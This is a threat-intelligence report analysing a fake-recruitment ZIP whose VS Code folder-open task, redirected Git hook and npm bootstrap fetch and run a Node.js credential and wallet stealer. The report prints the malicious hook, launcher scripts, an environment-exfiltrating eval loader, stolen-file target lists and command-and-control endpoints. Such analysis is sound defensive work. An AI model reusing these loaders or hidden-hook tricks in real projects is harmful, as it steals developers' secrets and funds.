---
title: "PawCommerce Developer Task: VS Code Folder-Open Tasks and Git Hooks Deliver Cross-Platform Node.js Stealer"
date: 2026-06-03
author: "ThreatProphet"
description: "Analysis of a PawCommerce-themed recruitment lure that delivered a OneDrive-hosted ZIP with dual execution routes: VS Code task-driven Git hook execution and an NPM postinstall/bootstrap path leading to modular Node.js credential theft, wallet collection, file exfiltration, clipboard monitoring, and Socket.IO command-and-control."
tags:
  - contagious-interview
  - deceptive-development-overlap
  - fake-developer-recruitment
  - vscode-tasks
  - git-hooks
  - javascript
  - node-js
  - wallet-theft
  - infostealer
  - backdoor
  - linkedin-lure
  - onedrive
  - vercel
  - tiiny-site
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.002
  - T1566.003
  - T1204.002
  - T1059.001
  - T1059.003
  - T1059.004
  - T1059.007
  - T1027
  - T1140
  - T1105
  - T1071.001
  - T1082
  - T1083
  - T1005
  - T1033
  - T1115
  - T1552.001
  - T1555.003
  - T1041
report_id: "TP-2026-015"
showToc: true
---

> *"What was given as work concealed its blade in the hidden hooks."*

## Executive Summary

This report analyzes a **PawCommerce-themed developer-task lure** delivered during a fake recruitment workflow. The initial contact occurred through LinkedIn, where a recruiter persona using the display name `Nathaniel Nicdao` asked whether the target would be open to a brief conversation and requested a CV or resume. The LinkedIn profile was later unavailable. A subsequent Google Calendar invitation used the persona `Mark Harris <mark.harris.workspace@gmail[.]com>`, and the development task was delivered through a OneDrive share displaying the account name `Mimori Okamoto`. The OneDrive page hosted a ZIP file named `pawCommerce.zip`.

The ZIP archive was not a benign coding challenge. Static analysis found two independent execution routes intended to activate when a developer opened or ran the project:

1. A **VS Code folder-open task** that attempts to enable automatic task execution, silently runs `git config core.hooksPath .github; git checkout main`, and triggers `.github/post-checkout`.
2. An **NPM/server bootstrap path** where `package.json` defines `postinstall: npm run dev`, the Express application invokes `initAppBootstrap()`, and a remote JSON payload is decoded and executed through `Function.constructor`.

The VS Code/Git hook path retrieves platform-specific launchers from `tanxilabs[.]com`, installs or locates Node.js, downloads `env-setup.js` and a package manifest into `~/.vscode` or `%USERPROFILE%\.vscode`, exfiltrates the full runtime environment to `ip-api-psi.vercel[.]app`, and executes the returned JavaScript through `eval(response.data)`. The final obfuscated JavaScript payload launches three child modules: `ldbScript`, `autoUploadScript`, and `socketScript`. These modules collect browser credentials and wallet artifacts, recursively upload sensitive files, monitor clipboard contents, and provide Socket.IO-based command-and-control.

The NPM/server bootstrap path decodes `DEV_API_KEY` into `hxxps://pink-aloise-9.tiiny[.]site/index.json`, sends the header `x-secret-key: _`, extracts the JSON field `cookies`, and executes it as JavaScript through `new Function.constructor('require', s)`. This path delivers the same malware framework with a different campaign/user key.

The strongest technical anchors are:

```text
45.61.148[.]220
45.61.148[.]220:8085
45.61.148[.]220:8086
45.61.148[.]220:8087
SuperStr0ngSecret@)@^
pid.7.1.lock
pid.7.2.lock
pid.7.3.lock
ldbScript / autoUploadScript / socketScript
ukey: 705
ukey: 706
```

The evidence supports **high confidence** that the archive is a malicious developer-task payload. The activity overlaps with public reporting on Contagious Interview / DeceptiveDevelopment-style developer targeting through fake recruitment, malicious repositories, VS Code task abuse, Node.js payloads, and credential/wallet theft. Attribution remains **low-to-medium confidence**: the tradecraft is consistent with DPRK-linked developer-targeting clusters, but this investigation does not contain a single artifact sufficient to attribute the activity to a specific state actor or named group.

---

## Evidence Basis and Scope

This report is based on preserved screenshots, the original `pawCommerce.zip`, static repository review, Git metadata extraction, static inspection of VS Code task and Git hook artifacts, controlled HTTP retrieval of staged payloads, HTTP response headers, captured payload bodies, and controlled deobfuscation of the final Node.js payloads.

No repository hook, shell script, Windows command script, NPM package, Node.js payload, or decoded child module was executed during analysis. Network payload retrieval was performed as controlled collection from an analysis environment. The evidence package is not distributed with this public report.

**Persona-use notice:** references to `Nathaniel Nicdao`, `Mark Harris`, and `Mimori Okamoto` describe display names observed in the lure workflow. They should be treated as actor-used or actor-abused persona metadata. This report does not establish whether any real person, legitimate account holder, or third party knowingly participated in the activity.

Claims in this report are separated into three categories:

- **Directly observed:** present in screenshots, the original ZIP, repository files, Git metadata, captured headers, captured response bodies, or recovered scripts.
- **Behavioral assessment:** inferred from static code review and controlled deobfuscation.
- **External/campaign context:** based on similarity to public reporting and previous ThreatProphet cases, not used alone as proof of attribution.

---

## Key Findings

| Finding | Assessment |
|---|---|
| Initial contact | LinkedIn recruitment message from persona `Nathaniel Nicdao`; profile later unavailable |
| Calendar persona | `Mark Harris <mark.harris.workspace@gmail[.]com>` through Google Calendar |
| Delivery platform | OneDrive share displaying account name `Mimori Okamoto` |
| Delivered file | `pawCommerce.zip` |
| Archive SHA-256 | `12b7d1156bc16b49ac369eb3e4960db1594db36093bcab4131ce00353ff225f8` |
| Repository theme | PetShop/PawCommerce e-commerce application |
| GitHub remote metadata | `git@github[.]com:purity111/petshop.git` |
| Commit actor metadata | `strong <strong.business.info@gmail[.]com>`; timezone `+0900` |
| Primary local triggers | VS Code folder-open task; Git hook redirection; NPM `postinstall`; server bootstrap |
| VS Code artifact | `.vscode/settings.json` attempts `task.allowAutomaticTasks: "on"` |
| VS Code task | `.vscode/tasks.json` uses `runOn: folderOpen` |
| Git hook path | `core.hooksPath = .github` |
| Git hook | `.github/post-checkout` retrieves OS-specific scripts from `tanxilabs[.]com` |
| First staging domain | `tanxilabs[.]com` |
| Environment exfiltration endpoint | `ip-api-psi.vercel[.]app/api/githook-encrypted/N3RlYW06` |
| Decoded API key marker | `N3RlYW06 -> 7team:` |
| Remote JSON staging | `pink-aloise-9.tiiny[.]site/index.json` |
| Final C2 IP | `45.61.148[.]220` |
| C2/exfil ports | `8085`, `8086`, `8087` |
| Payload structure | `ldbScript`, `autoUploadScript`, `socketScript` |
| Campaign/user keys | `705` for the `pink-aloise` bootstrap path; `706` for the Git-hook/Vercel path |
| Host lock files | `pid.7.1.lock`, `pid.7.2.lock`, `pid.7.3.lock` |
| Final malware role | Browser/wallet collector, recursive file stealer, clipboard monitor, Socket.IO C2, remote command capability |
| Attribution | Low-to-medium confidence Contagious Interview / DeceptiveDevelopment-style overlap; not definitive |

---

## Attack Overview

### Initial Contact

The first preserved social-engineering artifact is a LinkedIn message from a recruiter persona using the display name `Nathaniel Nicdao`. The message framed the contact as a technical opportunity:

```text
I came across your experience and thought it was worth reaching out directly. We're currently developing products with some interesting technical challenges, and your background seems like a strong fit.

We're looking for people who can think both technically and strategically, and your profile suggests that combination. The role is flexible and can adapt to your availability.

Would you be open to a brief conversation to explore this? If so, feel free to share your CV or Resume.

Best regards
Nathan
```

The LinkedIn profile was later unavailable. This disappearance is a useful preservation note, but it should not be used as independent attribution evidence.

A later calendar invitation used `Mark Harris <mark.harris.workspace@gmail[.]com>`. The email headers show Google Calendar delivery and successful Gmail/Google authentication checks for the sending path. This confirms that the invitation transited Google infrastructure; it does not validate the real-world identity of `Mark Harris`.

During the call workflow, the target received a OneDrive link to `pawCommerce.zip`. The OneDrive page showed:

| Field | Observed value |
|---|---|
| File | `pawCommerce.zip` |
| Type | ZIP file |
| Displayed owner/account | `Mimori Okamoto` |
| Date created | 2026-05-13 03:19 PM |
| Modified | 2026-05-13 03:28 PM |
| Size | 11.4 MB |

The public report intentionally omits the full OneDrive URL and tokenized `redeem` parameter.

### Archive Overview

The original ZIP metadata:

| Field | Value |
|---|---|
| Filename | `pawCommerce.zip` |
| SHA-256 | `12b7d1156bc16b49ac369eb3e4960db1594db36093bcab4131ce00353ff225f8` |
| Size | `11,995,978` bytes |
| Total ZIP entries | `557` |
| Files | `377` |
| Top-level folder | `pawCommerce/` |
| Earliest ZIP file timestamp | 2025-08-19 15:55:54 |
| Latest ZIP file timestamp | 2026-05-13 21:51:24 |

The archive contains a full local Git repository, VS Code workspace configuration, hidden Git-hook infrastructure, an Express/React application, and a server-side bootstrapper that retrieves remote code at runtime.

### Kill Chain

```text
LinkedIn recruitment message
  -> calendar/call workflow using Mark Harris Gmail persona
  -> OneDrive-hosted pawCommerce.zip
  -> victim extracts repository
  -> route 1: opens/trusts folder in VS Code
       -> .vscode/settings.json attempts to allow automatic tasks
       -> .vscode/tasks.json runs on folderOpen
       -> task executes: git config core.hooksPath .github; git checkout main
       -> .github/post-checkout retrieves tanxilabs.com/settings/<os>?flag=6
       -> OS-specific first-stage launcher writes into .vscode
       -> bootstrap locates or installs Node.js
       -> bootstrap downloads env-setup.js and package.json
       -> env-setup.js POSTs process.env to ip-api-psi.vercel.app
       -> response.data is executed with eval()
       -> final obfuscated Node.js payload, ukey 706

  -> route 2: runs npm install / npm run dev / npm start
       -> package.json postinstall triggers npm run dev
       -> Express app loads server/app.js
       -> server/app.js invokes initAppBootstrap()
       -> bootstrap.js decodes DEV_API_KEY to pink-aloise-9.tiiny.site/index.json
       -> axios retrieves JSON with header x-secret-key: _
       -> JSON cookies field is compiled with Function.constructor
       -> final obfuscated Node.js payload, ukey 705

  -> both final payloads launch:
       -> ldbScript: browser credential and wallet collection
       -> autoUploadScript: recursive sensitive-file discovery and upload
       -> socketScript: Socket.IO C2, remote command execution, file browsing, clipboard monitoring
```

---

## Technical Analysis

### Stage 0A: VS Code Folder-Open Task

The repository contains `.vscode/settings.json`:

```json
{
    "task.allowAutomaticTasks": "on"
}
```

It also contains `.vscode/tasks.json` with a folder-open task:

```json
{
  "label": "Git checkout to default branch",
  "type": "shell",
  "command": "git config core.hooksPath .github; git checkout main",
  "presentation": {
    "reveal": "never",
    "echo": false,
    "focus": false,
    "close": true,
    "panel": "dedicated",
    "showReuseMessage": false,
    "clear": true
  },
  "runOptions": {
    "runOn": "folderOpen"
  },
  "problemMatcher": []
}
```

The task performs two important actions:

```sh
git config core.hooksPath .github
git checkout main
```

The first command redirects Git hooks away from the default `.git/hooks/` directory into the repository-controlled `.github` directory. The second command immediately triggers the `post-checkout` hook after the hook path has been changed.

The task presentation settings suppress visibility by avoiding terminal reveal, disabling command echo, avoiding focus, closing the task panel, suppressing the reuse message, and clearing output.

**Caveat:** automatic execution depends on VS Code version, workspace trust state, user settings, and whether the workspace setting is honored in the target environment. Analytically, this is best described as an attempted automatic-execution path that becomes highly effective if the victim trusts the workspace.

### Stage 0B: Git Hook Redirection

The extracted `.git/config` contains:

```ini
[core]
    repositoryformatversion = 0
    filemode = false
    bare = false
    logallrefupdates = true
    symlinks = false
    ignorecase = true
    hooksPath = .github
[remote "origin"]
    url = git@github.com:purity111/petshop.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
    remote = origin
    merge = refs/heads/main
```

This means the malicious hook redirection is already present in the delivered local repository, and the VS Code task reinforces it.

The active hook is `.github/post-checkout`:

```sh
uname_s="$(uname -s 2>/dev/null || echo unknown)"
case "$uname_s" in
  Darwin)
    curl -s 'hxxps://tanxilabs[.]com/settings/mac?flag=6' | sh >/dev/null 2>&1
    exit 0
    ;;
  Linux)
    wget -qO- 'hxxps://tanxilabs[.]com/settings/linux?flag=6' | sh >/dev/null 2>&1
    exit 0
    ;;
  MINGW*|MSYS*|CYGWIN*)
    curl -s hxxps://tanxilabs[.]com/settings/windows?flag=6 | cmd >/dev/null 2>&1
    exit 0
    ;;
  *)
    exit 0
    ;;
esac
```

This hook selects platform-specific payload delivery. macOS and Linux responses are piped directly to `sh`; Windows-like Git environments pipe the response to `cmd`.

The repository also contains `.github/pre-commit` with a comment referencing `repo-root 101.js`, but the referenced `101.js` file was not present in the archive. This may be residue from a prior template or unused variant. It is useful as a pivot, not as a confirmed execution path in this case.

### Stage 1: Platform-Specific Launchers from `tanxilabs[.]com`

The platform launchers were retrieved from:

| Platform | URL | SHA-256 | Role |
|---|---|---|---|
| macOS | `hxxps://tanxilabs[.]com/settings/mac?flag=6` | `16460965b678024801d319d2142a9a39d930f72d0179bcd6a06faef6dd5b8170` | Downloads and launches `vscode-bootstrap.sh` |
| Linux | `hxxps://tanxilabs[.]com/settings/linux?flag=6` | `9fa866547d40783d194fbce567ccef2540b3dd97ba0a865d88d819740216ae34` | Downloads and launches `vscode-bootstrap.sh` |
| Windows | `hxxps://tanxilabs[.]com/settings/windows?flag=6` | `193fe17b9ec5af160a9a2bf2eb6db7a59665efb5c180af62b193267a757cae82` | Downloads and runs `vscode-bootstrap.cmd` |

The macOS first-stage body:

```sh
#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "hxxps://tanxilabs[.]com/settings/bootstraplinux?flag=6"
clear
chmod +x "$HOME/.vscode/vscode-bootstrap.sh"
clear
nohup bash "$HOME/.vscode/vscode-bootstrap.sh" > /dev/null 2>&1 &
clear
exit 0
```

The Linux first-stage body is functionally equivalent, but uses `wget`:

```sh
TARGET_DIR="$HOME/.vscode"
mkdir -p "$TARGET_DIR"
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "hxxps://tanxilabs[.]com/settings/bootstraplinux?flag=6"
chmod +x "$TARGET_DIR/vscode-bootstrap.sh"
nohup bash "$TARGET_DIR/vscode-bootstrap.sh" > /dev/null 2>&1 &
```

The Windows first-stage body downloads and runs a CMD bootstrapper:

```bat
@echo off
set "VSCODE_DIR=%USERPROFILE%\.vscode"

if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR%" )

curl -s -L -o "%VSCODE_DIR%\vscode-bootstrap.cmd" hxxps://tanxilabs[.]com/settings/bootstrap?flag=6
cls
"%VSCODE_DIR%\vscode-bootstrap.cmd"
cls
```

The repeated use of `.vscode`, `clear`/`cls`, and background execution helps the chain blend into normal developer tooling while reducing immediate visual feedback.

### Stage 2A: Linux/macOS Node.js Bootstrapper

The Linux/macOS bootstrapper was retrieved from:

```text
hxxps://tanxilabs[.]com/settings/bootstraplinux?flag=6
```

Hash:

```text
2924c4d2ca90c44319a63b2cb11e192e953f8c33d451ba77e9b169e62e559df7
```

The script checks for global Node.js. If Node.js is missing, it downloads the latest Node.js release metadata from `nodejs.org`, retrieves a portable tarball, and extracts it under `$HOME/.vscode`.

It then downloads follow-on components:

```sh
BASE_URL="hxxps://tanxilabs[.]com"

curl -s -L -o "${USER_HOME}/env-setup.js" "${BASE_URL}/settings/env?flag=6"
curl -s -L -o "${USER_HOME}/package.json" "${BASE_URL}/settings/package"
```

It installs dependencies silently:

```sh
npm install --silent --no-progress --loglevel=error --fund=false
```

Finally, it executes the environment loader:

```sh
"$NODE_EXE" "${USER_HOME}/env-setup.js"
```

Legitimate `nodejs.org` infrastructure is used only to obtain a Node.js runtime. It should not be treated as actor-controlled infrastructure.

### Stage 2B: Windows Node.js Bootstrapper

The Windows bootstrapper was retrieved from:

```text
hxxps://tanxilabs[.]com/settings/bootstrap?flag=6
```

Hash:

```text
b905367f92847d249ac08fb2e5be61adecf00f0e5f8109c282ac8570f9181de9
```

The script relaunches itself hidden through PowerShell:

```bat
if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b
```

It checks for global Node.js. If Node.js is missing, it retrieves the latest Node.js version through PowerShell, downloads the Windows x64 MSI, and extracts it as a portable runtime:

```bat
for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod hxxps://nodejs[.]org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=hxxps://nodejs[.]org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
```

It then downloads the same follow-on environment stage and package manifest to `%USERPROFILE%\.vscode`, using a disguised extension for the JavaScript loader:

```bat
curl -L -o "%CODEPROFILE%\env-setup.npl" "hxxps://tanxilabs[.]com/settings/env?flag=6"
curl -L -o "%CODEPROFILE%\package.json" "hxxps://tanxilabs[.]com/settings/package"
```

The loader is executed with Node.js:

```bat
"%NODE_EXE%" "%CODEPROFILE%\env-setup.npl"
```

The `.npl` extension appears to be cosmetic; the body is JavaScript.

### Stage 3: Environment Exfiltration and Dynamic Payload Execution

The captured `env-setup.js` has SHA-256:

```text
eff1a9d27d08f058e3d5490d0b1cb6f695a77ca3bce1e7cc413b322dad25cad2
```

Recovered content:

```javascript
const axios = require('axios');
const host = "ip-api-psi.vercel.app";
const apikey = "N3RlYW06";
axios
  .post(
    `hxxps://${host}/api/githook-encrypted/${apikey}`,
    { ...process.env },
    { headers: { "x-secret-header": "secret" } }
  )
  .then((response) => {
    eval(response.data);
    return response.data;
  })
  .catch((err) => {
    return false;
  });
```

The value `N3RlYW06` decodes to:

```text
7team:
```

This stage performs two high-risk actions:

1. It transmits the full runtime environment through `{ ...process.env }`.
2. It executes the server response with `eval(response.data)`.

The captured package manifest has SHA-256:

```text
017cb09cabd9c909e4fb06e8c668d2f89e472e103eda5230d98761a9f998bdb5
```

It declares:

```json
{
  "name": "env",
  "version": "1.0.0",
  "devDependencies": {
    "hardhat": "^2.20.2"
  },
  "dependencies": {
    "axios": "^1.10.0",
    "fs": "^0.0.1-security",
    "request": "^2.88.2",
    "clipboardy": "^4.0.0",
    "socket.io-client": "^4.8.1",
    "sql.js": "^1.13.0"
  }
}
```

`hardhat` likely provides Web3/developer-task camouflage. `axios`, `clipboardy`, `socket.io-client`, and `sql.js` align with the later environment exfiltration, clipboard access, C2, and browser database handling.

### Stage 4A: Final Payload from `ip-api-psi.vercel[.]app` - `ukey: 706`

The environment-exfiltration endpoint returned a large obfuscated JavaScript payload:

```text
hxxps://ip-api-psi.vercel[.]app/api/githook-encrypted/N3RlYW06
```

Hash:

```text
6f7fa17c61c3598e3f5e4b69078e3463e7dd859760b6ea0fc76412b6249c7182
```

Controlled deobfuscation recovered:

| Extracted module | SHA-256 | Role |
|---|---|---|
| `ldbScript` | `0530113b0dbaef971f8753fffdc2ee121b35219176472e27eff754ee66148f5a` | Browser credential, wallet, and local profile artifact collection |
| `autoUploadScript` | `9eda8450bec119442ce165927903b37bb706f573564c8edebc5d5e11409e0548` | Recursive sensitive-file discovery and exfiltration |
| `socketScript` | `7fc561a0568bac02e36e44328b0b600bb3843af9db84d6647065d21ec5f69bec` | Socket.IO C2, remote command execution, file browsing/upload, clipboard monitoring |

The payload sends an initial log message to:

```text
hxxp://45.61.148[.]220:8087/api/log
```

Observed startup structure:

```json
{
  "ukey": 706,
  "t": 7,
  "host": "706_<hostname>",
  "message": "Starting client",
  "level": "info"
}
```

It then launches child scripts through Node.js stdin execution:

```text
node --max-old-space-size=4096 --no-warnings -
```

Associated lock files:

```text
pid.7.1.lock
pid.7.2.lock
pid.7.3.lock
```

### Stage 4B: Parallel JSON Payload from `pink-aloise-9.tiiny[.]site` - `ukey: 705`

The repository also contains an independent NPM/server bootstrap path.

`package.json` includes:

```json
"postinstall": "npm run dev"
```

`server/app.js` imports and invokes:

```javascript
const { initAppBootstrap } = require('./utils/bootstrap.js');
...
initAppBootstrap();
```

`server/config/bootstrapConfig.js` contains:

```javascript
module.exports = {
  DEV_API_KEY: "aHR0cHM6Ly9waW5rLWFsb2lzZS05LnRpaW55LnNpdGUvaW5kZXguanNvbg==",
};
```

This Base64 value decodes to:

```text
hxxps://pink-aloise-9.tiiny[.]site/index.json
```

`server/.env` contains:

```text
DEV_SECRET_KEY="eC1zZWNyZXQta2V5"
DEV_SECRET_VALUE="Xw=="
```

Decoded values:

```text
DEV_SECRET_KEY   -> x-secret-key
DEV_SECRET_VALUE -> _
```

`server/utils/bootstrap.js` retrieves the remote JSON, extracts the `cookies` field, and executes it through `Function.constructor`:

```javascript
const src = atob(DEV_API_KEY);
const k = atob(process.env.DEV_SECRET_KEY);
const v = atob(process.env.DEV_SECRET_VALUE);
const s = (await axios.get(src, { headers: { [k]: v } })).data.cookies;
const handler = new (Function.constructor)('require', s);
handler(require);
```

The captured JSON body has SHA-256:

```text
0318447e756ce588c7b699f82e8dcec6f8cae100444a824bb89c98015087d184
```

Controlled deobfuscation recovered:

| Extracted artifact | SHA-256 | Role |
|---|---|---|
| Extracted obfuscated JavaScript payload | `f8f7ed336e109ddeb7d2c0098f43f6d065c479325b84cfb0613b1a2d6f06b4a6` | Stage-1 loader |
| `ldbScript` | `8e16504e5e6bcefe45a9fc352ee61e1d5aed7a966434730a73a1b899208445c3` | Browser credential and wallet collector |
| `autoUploadScript` | `8c420f837a53c075b0ff57ea1a12d1cad0c8247444cb9333eb3ee865260eafc7` | Sensitive-file discovery and exfiltration |
| `socketScript` | `62f9031511106993c9b656a741391ededf78fd2b808ee55017d85941b9933d8f` | Socket.IO C2 and remote command component |

This path uses campaign/user key `705`, compared with `706` in the Git-hook/Vercel path. The shared infrastructure, child-module architecture, lock-file pattern, C2 host, C2 ports, and HMAC secret strongly support that both routes belong to the same malware framework or builder.

---

## Payload Behavior

### Child Module: `ldbScript`

`ldbScript` targets browser credentials, browser profile data, and cryptocurrency wallet artifacts across Windows, macOS, Linux, and WSL.

Targeted browser families include:

```text
Chrome
Chromium
Brave
Microsoft Edge
Opera
Opera GX
Vivaldi
Yandex
Kiwi
Iridium
Comodo Dragon
SRWare Iron
```

Targeted artifacts include:

```text
Local State
Login Data
Login Data For Account
Web Data
Local Extension Settings/*
Brave Wallet LevelDB data
macOS login.keychain-db
sysinfo.txt
s.txt
```

The script contains platform-specific browser credential decryption logic:

| Platform | Observed behavior |
|---|---|
| Windows | DPAPI access through PowerShell and `.NET` `System.Security.Cryptography.ProtectedData.Unprotect` |
| Linux | Attempts `secret-tool` and Python `secretstorage` |
| macOS | Attempts browser Safe Storage / Keychain-related access |

It also supports AES-GCM encrypted Chromium credential formats.

Primary upload endpoint:

```text
hxxp://45.61.148[.]220:8085/upload
```

Observed upload metadata fields include:

```text
userkey: 705 or 706
t: 7
hostname: <encoded hostname>
timestamp: <unix timestamp>
file-metadata: <JSON metadata>
validation: <HMAC-SHA256 value>
```

Recovered HMAC validation secret:

```text
SuperStr0ngSecret@)@^
```

### Child Module: `autoUploadScript`

`autoUploadScript` performs recursive discovery and upload of sensitive files from user-accessible locations.

Targeted directories include:

```text
Desktop
Documents
Downloads
Library/CloudStorage
Projects
projects
Development
development
Code
code
Code Projects
source
Source
OneDrive
Google Drive
GoogleDrive
/mnt
```

The inclusion of `/mnt` is significant for WSL, where Windows drives are commonly exposed under `/mnt/c`, `/mnt/d`, and similar paths.

Targeted file and path patterns include:

```text
.env
env
config
.conf
.cfg
.ini
.yaml
.yml
.toml
metamask
phantom
wallet
bitcoin
ethereum
trust
exodus
ledger
trezor
private_key
private-key
keypair
seed
mnemonic
recovery phrase
id_rsa
id_dsa
id_ecdsa
id_ed25519
.pem
.p12
.pfx
.jks
.crt
.cer
.der
password
passwd
credentials
token
api_key
secret
.db
.sqlite
.sql
.doc
.docx
.pdf
.xls
.xlsx
.txt
.md
screenshots
notes
backups
cookies
sessions
```

The script skips files larger than approximately 5 MB. This likely reduces noise and focuses exfiltration on secrets, key material, wallet artifacts, and small documents.

Primary upload endpoint:

```text
hxxp://45.61.148[.]220:8086/upload
```

### Child Module: `socketScript`

`socketScript` provides the interactive C2 component.

C2 endpoint:

```text
ws://45.61.148[.]220:8087
```

HTTP support endpoints:

```text
hxxp://45.61.148[.]220:8087/api/log
hxxp://45.61.148[.]220:8087/api/notify
```

Additional file upload/retrieval endpoints:

```text
hxxp://45.61.148[.]220:8085/api/upload-file
hxxp://45.61.148[.]220:8085/api/file/7/<host>?path=<encoded-path>
```

Recovered capabilities include:

```text
Host registration
Process status reporting
Start/stop control for child scripts
Remote command execution
Directory listing
Single-file upload
Bulk upload from a directory
.env discovery and upload
Clipboard monitoring
```

Observed task-code references include:

```text
102  directory listing
107  single-file upload or retrieval
108  bulk upload of immediate child files from a directory
```

Clipboard access methods vary by platform:

```text
Windows: PowerShell + System.Windows.Forms.Clipboard
macOS: pbpaste
Linux: xclip or xsel
WSL: powershell.exe clipboard access
```

Clipboard contents are checked at roughly one-second intervals and sent to the C2 log endpoint when changed.

### WSL-Aware Behavior

The payload detects Windows Subsystem for Linux through:

```text
process.env.WSL_DISTRO_NAME
/proc/version containing "microsoft" or "wsl"
```

When WSL is detected, it attempts to reach Windows-side resources through:

```text
/mnt/c/Users
cmd.exe /c echo %USERNAME%
powershell.exe
```

This behavior is operationally important. Developers may run unknown tasks inside WSL believing they are separated from the Windows host. This payload explicitly treats WSL and Windows as a shared compromise boundary.

---

## Infrastructure Analysis

### Staging and Delivery Infrastructure

| Indicator | Role | Hosting observations |
|---|---|---|
| `onedrive.live[.]com` | Delivery of `pawCommerce.zip` | OneDrive share, full URL omitted from public report |
| `pink-aloise-9.tiiny[.]site` | Remote JSON payload path for NPM/server bootstrap | Amazon S3 behind CloudFront |
| `tanxilabs[.]com` | OS-specific Git-hook loader infrastructure | Vercel/Express |
| `ip-api-psi.vercel[.]app` | Environment exfiltration and final payload response | Vercel/Express |
| `nodejs[.]org` | Legitimate Node.js runtime download source | Abused as legitimate dependency source; not actor-controlled |

The `pink-aloise-9.tiiny[.]site/index.json` response was served as `application/json` with `Content-Length: 3763914`, `Server: AmazonS3`, and CloudFront cache metadata. The object `Last-Modified` value was `Wed, 13 May 2026 12:48:58 GMT`, close to the OneDrive file timestamps and local Git reflog activity from the same date. This is useful as staging-time correlation, not as actor-location evidence.

The `tanxilabs[.]com` endpoints returned Vercel/Express responses with `Access-Control-Allow-Origin: *`, `X-Powered-By: Express`, and rate-limit headers. The first-stage OS selectors were small text bodies:

| Endpoint | Content length | Body role |
|---|---:|---|
| `/settings/mac?flag=6` | 311 bytes | macOS first-stage shell launcher |
| `/settings/linux?flag=6` | 328 bytes | Linux first-stage shell launcher |
| `/settings/windows?flag=6` | 245 bytes | Windows first-stage CMD launcher |
| `/settings/bootstraplinux?flag=6` | 5,772 bytes | Linux/macOS Node.js bootstrapper |
| `/settings/bootstrap?flag=6` | 3,720 bytes | Windows Node.js bootstrapper |
| `/settings/env?flag=6` | 367 bytes | Environment-exfiltration JavaScript |
| `/settings/package` | 384 bytes | NPM package manifest |

The `ip-api-psi.vercel[.]app` final-payload endpoint returned `Content-Length: 3550092` and `Content-Type: text/html; charset=utf-8`. Operationally, the body is JavaScript executed by `eval(response.data)`. The mismatch between MIME type and execution behavior is useful for detection.

Certificate transparency collection attempts returned `502 Bad Gateway` HTML during this investigation and are not used as evidence.

### C2 and Exfiltration Infrastructure

| Indicator | Role |
|---|---|
| `45.61.148[.]220:8085` | Browser/wallet upload, file upload, file retrieval |
| `45.61.148[.]220:8086` | Sensitive-file upload |
| `45.61.148[.]220:8087` | Logging, notification, Socket.IO C2 |

Observed endpoints:

```text
hxxp://45.61.148[.]220:8085/upload
hxxp://45.61.148[.]220:8085/api/upload-file
hxxp://45.61.148[.]220:8085/api/file/7/<host>?path=<encoded-path>
hxxp://45.61.148[.]220:8086/upload
hxxp://45.61.148[.]220:8087/api/log
hxxp://45.61.148[.]220:8087/api/notify
ws://45.61.148[.]220:8087
```

---

## Git and Repository Metadata

The local Git metadata is useful for clustering, but it should be treated as actor-controlled and low-confidence for real-world identity or location.

| Field | Value |
|---|---|
| Remote URL | `git@github[.]com:purity111/petshop.git` |
| Owner/repo | `purity111/petshop` |
| HEAD SHA | `6a76108793385bb41c703175112c0bee32848f58` |
| Branch | `main` |
| Subject | `saveDraft` |
| Author | `strong <strong.business.info@gmail[.]com>` |
| Committer | `strong <strong.business.info@gmail[.]com>` |
| Author date | `2025-12-15T11:19:22+09:00` |
| Commit date | `2025-12-15T11:19:22+09:00` |
| Reflog time zones | `+0900` |
| Additional repo marker | `.repo_name.txt -> parts-fml8tiqb` |

Reflog activity included an initial commit on 2025-12-15 and checkout events on 2026-04-24 and 2026-05-13. The 2026-05-13 checkout timestamp is close to the OneDrive file timestamp and the `pink-aloise` payload object's last-modified timestamp. This correlation is useful for staging timeline reconstruction, but it is not sufficient to infer actor timezone or location.

---

## Relationship to TP-2026-014

The closest prior ThreatProphet overlap identified during this investigation is **TP-2026-014, AI-Powered RWA Finance Platform**. Both cases used fake developer-recruitment workflows to deliver ZIP archives containing full local Git repositories, and both abused Git-hook execution as part of the local activation path. TP-2026-014 relied on a README instruction to run `git checkout dev`, which triggered `.git/hooks/post-checkout`; PawCommerce uses a VS Code folder-open task to run `git config core.hooksPath .github; git checkout main`, which redirects hooks to `.github` and triggers `.github/post-checkout`.

The payload architecture also overlaps at a meaningful level. TP-2026-014 staged payload material under `$HOME/.vscode`, used Node.js as the runtime, targeted browser profiles, wallet material, local secrets, and WSL/Windows context, and recovered a tri-port C2 layout on `8085`, `8086`, and `8087`. PawCommerce uses the same broad service pattern on `45.61.148[.]220:8085`, `45.61.148[.]220:8086`, and `45.61.148[.]220:8087`, with `8085` supporting browser/wallet and socket-driven file operations, `8086` supporting recursive sensitive-file upload, and `8087` supporting log, notify, and Socket.IO command-and-control behavior.

The overlap is therefore strongest at the **execution-mechanism, payload-role, and service-layout** levels: fake recruitment ZIP delivery, Git-hook execution, `.vscode` staging, Node.js payloading, browser/wallet/file targeting, WSL-aware behavior, and the `8085/8086/8087` infrastructure pattern. Exact infrastructure reuse is not established. TP-2026-014 used `216.126.225[.]243`, while PawCommerce uses `45.61.148[.]220`; payload hashes and campaign markers also differ. This should be framed as **tooling-family or operator-workflow similarity**, not proof that both cases were operated from the same infrastructure or by the same actor.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.002 | Spearphishing Link | Initial Access | Recruitment workflow used LinkedIn, Google Calendar, and OneDrive delivery |
